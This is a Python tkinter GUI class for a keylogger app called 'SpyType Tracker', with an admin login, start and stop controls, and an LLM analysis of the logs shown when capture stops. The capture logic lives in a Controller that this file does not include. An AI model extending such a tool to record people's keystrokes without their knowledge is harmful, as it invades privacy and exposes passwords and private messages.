import tkinter as tk
from tkinter import messagebox, simpledialog
from app.controller import Controller

class KeyLoggerGUI:
    def __init__(self, root):
        self.controller = Controller()
        self.root = root
        self.root.title("SpyType Tracker - Keystrokes Capturing")

        self.login_button = tk.Button(root, text="Login as Admin", command=self.login_as_admin)
        self.login_button.pack(pady=10)

        self.start_button = tk.Button(root, text="Start Keylogger", command=self.start_keylogger, state=tk.DISABLED)
        self.start_button.pack(pady=10)

        self.stop_button = tk.Button(root, text="Stop Keylogger", command=self.stop_keylogger, state=tk.DISABLED)
        self.stop_button.pack(pady=10)

        self.status_label = tk.Label(root, text="Keylogger is not active")
        self.status_label.pack(pady=15)

    def login_as_admin(self):
        password = simpledialog.askstring("Admin Login", "Enter Admin Password:", show='*')
        if self.controller.login(password):
            self.status_label.config(text="Admin logged in")
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.NORMAL)
            self.login_button.config(state=tk.DISABLED)
        else:
            messagebox.showerror("Login Failed", "Incorrect password.")

    def start_keylogger(self):
        self.controller.start_logging()
        self.status_label.config(text="Keylogger is active")

    def stop_keylogger(self):
        password = simpledialog.askstring("Admin", "Re-enter Password to Stop:", show='*')
        success, analysis = self.controller.stop_logging(password)
        if success:
            self.status_label.config(text="Keylogger stopped. Logs analyzed.")
            messagebox.showinfo("LLM Analysis", analysis)
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.DISABLED)
            self.login_button.config(state=tk.NORMAL)
        else:
            messagebox.showerror("Access Denied", analysis)
